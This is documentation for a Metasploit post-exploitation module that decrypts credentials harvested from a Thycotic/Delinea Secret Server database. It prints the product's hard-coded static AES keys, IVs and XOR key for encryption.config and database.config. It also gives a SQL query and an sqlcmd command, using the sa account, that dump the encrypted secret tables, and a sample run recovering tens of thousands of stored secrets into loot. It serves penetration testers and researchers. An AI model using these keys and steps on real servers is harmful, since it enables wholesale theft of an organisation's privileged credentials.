This module exports and decrypts Secret Server credentials that have been previously dumped to
a CSV file. It is intended to be used in situations where the Secret Server encryption
parameters and database data have been previously extracted from a Windows host with
Delia/Thycotic Secret Server installed. The module will produce a CSV file containing decrypted
plaintext by taking hex values for the Master Encryption Key (`MEK`) and a CSV file of SQL data as
input.

This module incorporates original research published by the authors of SecretServerSecretStealer,
a PowerShell script designed to harvest Secret Server credentials. The GitHub repo for
SecretStealer.ps1 includes tons of notes on the internals of Secret Server:

https://github.com/denandz/SecretServerSecretStealer

## Vulnerable Application
This module should have no problem decrypting the database for versions 10.4 through 11.2, though
it has only been tested against a system running version 11.2.  It is intended to be run after
successfully exploiting a Windows host with the Delia/Thycotic Secret Server software installed and
extracting the contents of the Secret Server SQL database to CSV file. You must also possess the
encryption parameters from `encryption.config` to capture the KEY, KEY256, and IV values the module
requires as input.

## Verification Steps

### Acquire MEK Values
You must possess the MEK keys and IV in hexadecimal format in order to perform decryption. These
can be recovered from the `encryption.config` file present in the IIS web root under the `.\SecretServer`
virtual directory. Secret Server performs myriad operations to attempt to make it difficult to recover
the data, including bit flips and XOR of certain data segments. A full description of the file hydration
process for `encryption.config` is beyond the scope of this document; however, very detailed information
on the process is available at GitHub repo for `SecretStealer.ps1`:

  https://github.com/denandz/SecretServerSecretStealer

For the bold, below are the static keys used to encrypt the data by default. Note that Secret Server
allows the administrator to further configure native Windows Data Protection API (DPAPI) encryption,
though this option is not enabled by default. If enabled, MEK values must first be decrypted with
the AES-256 MachineKey. In any case the process is convoluted enough that should the situation call
for out-of-band extraction of the MEK details, relying on `SecretStealer.ps1` is highly recommended.

Secret Server `encryption.config` static AES-256 key:
  `83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088`

Secret Server `encryption.config` static AES IV:
  `ad478c63f93d5201e0a1bbfff0072b6b`

Secret Server `encryption.config` XOR key:
  `8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e`

MEK values including the 128 and 256-bit keys and 128-bit IV must be formatted as valid hexadecimal
strings.

### Acquire Database Export
You must possess a properly formatted CSV export of Secret Server data in order to use this module.
Secret Server uses `MSSQL` as a backend and stores database parameters including the `sa` credential in
`database.config`, likewise stored under the `.\SecretServer` virtual directory in the IIS web root. The
file contains a collection of key-value pairs stored as .NET binary serialized data. Like
`encryption.config`, this file is also encrypted, though it uses a different static key and is fairly
straightforward. Notably, the `database.config` file uses a 128-bit AES key:

Secret Server `database.config` static AES-128 key:
  `020216980119760c0b79017097830b1d`

Secret Server `database.config` static AES IV:
  `7a790a22020b6eb3630cdd080310d40a`

Successful decryption of the file should allow the relevant values including the `sa` password to be
extracted from the plaintext; this step is not required if `SYSADMIN` level access to the target SQL
instance has already been accomplished through other means. Once access to the target database is
achieved, the following SQL query will extract the data in a format the module can digest:

```
SELECT s.SecretID,s.LastModifiedDate,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID);
```

Alternatively, the following `sqlcmd` syntax can be used from the command line:

```
sqlcmd -d "SecretServer" -S "localhost\SQLEXPRESS" -U "sa" -P "*****" -Q "SET NOCOUNT ON;SELECT s.SecretID,s.LastModifiedDate,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)" -h-1 -s"," -w 65535 -W -I
```

Explicit username / password `-U` and `-P` values can be removed in favor of `-E` if executing in the 
context of an account that has access to the target SQL instance and database via Windows integrated
authentication. Note that plaintext fields are deliberately cast to VARBINARY to deal with secret
names or fields with commas in the column data; this is necessary due to MSSQL's shocking inability to
natively produce valid CSV data.

CSV data must have the following header to be processed by this module:

`'SecretID,LastModifiedDate,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'`

and an example row should look like:

`1,2022-07-25 00:20:49.550,1,0x0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF,0x0123456789ABCDEF0123456789ABCDEF,1,1,1,0123456789ABCDEF0123456789ABCDEF,0x03033EED12D312682FC16186983B991753770E5189C643F715F9EE09EF610DCD0F6A242855FE9F1424113F9CC5012BF7F109F85F3E632B917EB19CA971AE971753488BF3AFDB9E6E9870C73C78E204813AF5DFA0EFD11B2FB16A77B3CF36E2581130A,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF,030230cbd03d72fb08f0445deadbd1cd7c48f715e490a36f81edd5035de8cb9835eaa43594c5b9240a659fcfd288dd6f359cbbb32b33fd5156621fd1addaa6523d031ad7e852aa0f8628b4,NULL,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF`

1. Acquire the decrypted MEK key and IV values from `encryption.config` on the target Secret Server
2. Acquire a properly formatted CSV export of encrypted Secret Server data per above
3. Start msfconsole
4. Do: `use auxiliary/gather/thycotic_secretserver_offline_decrypt`
5. Do: `set csvfile <path to csv>` where `<path to csv>` is the path to the database export CSV file
6. Do: `set key <key>` where `<key>` is the AES-128 MEK in hexadecimal format
7. Do: `set key256 <key256>` where `<key256>` is the AES-256 MEK in hexadecimal format
8. Do: `set iv <iv>` where `<iv>` is the MEK IV in hexadecimal format
9. Do: `set ip <ip>` to attach the target IPv4 address to loot entries (Optional)
10. Do: `dump`

## Options

### KEY

The Secret Server AES-128 Master Encryption Key, in hexadecimal format.

### KEY256

The Secret Server AES-256 Master Encryption Key, in hexadecimal format.

### IV

The Secret Server Master Encryption IV, in hexadecimal format.

### IP

Optional parameter to set the IPv4 address associated with loot entries made by the module.

## Scenarios
Example run against data extracted from Secret Server 11.2:

```
msf6 > use auxiliary/gather/thycotic_secretserver_offline_decrypt
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > set csvfile /tmp/secretserver.csv
csvfile => /tmp/secretserver.csv
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > set key fc35d1abcade1c180c699e10fbb3efeb
key => fc35d1abcade1c180c699e10fbb3efeb
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > set key256 e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109
key256 => e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > set iv 2c2df1a68dbc29adc66041bd6e6e4ad3
iv => 2c2df1a68dbc29adc66041bd6e6e4ad3
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > set ip 10.1.0.113
ip => 10.1.0.113
msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > show options

Module options (auxiliary/gather/thycotic_secretserver_offline_decrypt):

   Name     Current Setting                                                   Required  Description
   ----     ---------------                                                   --------  -----------
   CSVFILE  /tmp/secretserver.csv                                             yes       Path to database dump CSV file
   IP       10.1.0.113                                                        no        (Optional) IPv4 address to attach to loot
   IV       2c2df1a68dbc29adc66041bd6e6e4ad3                                  yes       SecretServer MEK IV (hex)
   KEY      fc35d1abcade1c180c699e10fbb3efeb                                  yes       SecretServer 128-bit AES MEK value (hex)
   KEY256   e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109  yes       SecretServer 256-bit AES MEK value (hex)


Auxiliary action:

   Name  Description
   ----  -----------
   Dump  Perform decryption of SecretServer database export file


msf6 auxiliary(gather/thycotic_secretserver_offline_decrypt) > dump

[+] Secret Server Encryption Configuration:
[+]        KEY: fc35d1abcade1c180c699e10fbb3efeb
[+]     KEY256: e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109
[+]         IV: 2c2df1a68dbc29adc66041bd6e6e4ad3
[*] Read database export CSV ...
[+] 47842 rows loaded, 19915 unique SecretIDs
[*] Process Secret Server DB ...
[!] SecretID 4092 field SFTP Site contains invalid UTF-8 and will be stored as a Base64 string in the output file
[!] SecretID 11097 field Notes contains invalid UTF-8 and will be stored as a Base64 string in the output file
[-] SecretID 11319 field Notes failed to decrypt
[!] 47842 rows processed (1 rows failed)
[*] 47841 rows recovered: 34479 plaintext, 13336 decrypted (2699 blank)
[*] 45142 rows written (2699 blank rows withheld)
[+] 19836 unique SecretID records recovered
[+] Decrypted Secret Server Database Dump: /root/.msf4/loot/20220823082010_default_10.1.0.113_ss_dec_645710.csv
[*] Auxiliary module execution completed
```